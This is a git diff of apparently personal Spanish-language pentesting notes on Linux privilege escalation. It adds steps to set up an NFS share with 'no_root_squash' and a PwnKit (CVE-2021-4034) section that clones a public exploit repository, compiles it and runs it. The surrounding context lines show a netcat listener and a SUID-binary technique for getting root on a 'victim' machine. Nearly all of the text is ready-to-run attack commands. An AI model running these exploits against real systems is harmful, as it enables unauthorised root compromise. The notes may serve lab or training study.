@@ -326,6 +326,11 @@ nc -nlvp 6666
 Si la opción "no_root_squash" está presente en un recurso compartido con permisos de escritura, podemos crear un ejecutable con el bit SUID activado y ejecutarlo en el sistema de destino.
 ```
 EN LA MAQUINA VICTIMA:
+sudo apt install nfs-kernel-server (se instala, si no esta)
+sudo /etc/exports -->
+/home *(rw, no_root_squash)
+sudo /etc/init.d/nfs-kernel-server restart
+
 cat /etc/exports (IDENTIFICAR LAS CARPETAS COMPARTIDAS WRITABLE Y "no_root_squash"
 
 EN LA MAQUINA LOCAL:
@@ -352,4 +357,13 @@ chmod +s nfs (se le da el bit SUID)
 MAQUINA VICTIMA:
 cd [carpeta montada]
 ./nfs (SE EJECUTA EL SCRIPT, Y WE AREEE ROOT!!!)
+```
+Vulnerabilidad PoC Pkexec
+```
+mkdir /tmp/pwnkit
+git clone https://github.com/berdav/CVE-2021-4034.git
+cp -r CVE-2021-4034 /tmp/pwnkit
+cd /tmp/pwnkit
+make
+./cve-2021-4034
 ```
